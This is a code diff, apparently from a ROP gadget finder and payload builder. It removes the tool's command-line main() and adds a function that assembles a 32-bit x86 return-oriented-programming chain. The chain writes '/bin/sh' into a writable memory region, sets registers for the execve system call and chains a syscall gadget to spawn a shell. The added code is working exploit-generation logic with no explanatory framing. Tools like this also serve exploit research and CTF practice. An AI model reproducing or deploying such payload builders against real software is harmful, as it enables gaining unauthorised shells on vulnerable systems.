@@ -23,55 +23,18 @@
 /************************************************************************/
 
 
-int main(int argc, char **argv) {
-  BINFMT bin;
-  GLIST *glist;
-  SLIST *slist;
-  PAYLOAD *payload;
+void payload_x86_execve_bin_sh(BINFMT *bin, const GLIST *src, PAYLOAD *dst) {
+  MEM *data;
 
-  /* Parse command line options */
-  options_parse(argc, argv);
-  
-  /* Mmap bin file and parse it */
-  bin_load(&bin, options_filename);
+  if((data = bin_getmem(bin, MEM_FLAG_PROT_R | MEM_FLAG_PROT_W)) == NULL)
+    FATAL_ERROR("Can't find a +RW memory region");
 
-  /* Gadget mode */
-  if(options_mode == MODE_GADGET) {
-    glist = glist_new();
-    gfind_in_bin(glist, &bin);
-    print_glist(glist);
-    glist_free(&glist);
-  }
-
-  /* String mode */
-  if(options_mode == MODE_STRING) {
-    slist = slist_new();
-    sfind_in_bin(slist, &bin, &options_search);
-    print_slist(slist);
-    slist_free(&slist);
-  }
-
-  /* Payload mode */
-  if(options_mode == MODE_PAYLOAD) {
-    glist = glist_new();
-    gfind_in_bin(glist, &bin);
-    payload = payload_new();
-
-    payload_make(&bin, glist, payload, options_payload);
-    print_payload(payload);
-    glist_free(&glist);
-    payload_free(&payload);
-  }
-
-  /* cleanup */
-
-  bin_free(&bin);
-
-  if(options_search.start)
-    free(options_search.start);
-
-  if(options_bad.start)
-    free(options_bad.start);
-
-  return EXIT_SUCCESS;
+  gmake_x86_strcp(src, dst, data->addr, "/bin/sh");
+  gmake_x86_setmem(src, dst, data->addr+8, data->addr);
+  gmake_x86_setmem(src, dst, data->addr+12, 0);
+  gmake_x86_setreg(src, dst, "eax", 11);
+  gmake_x86_setreg(src, dst, "ebx", data->addr);
+  gmake_x86_setreg(src, dst, "ecx", data->addr+8);
+  gmake_x86_setreg(src, dst, "edx", data->addr+12);
+  gmake_x86_syscall(src, dst);
 }
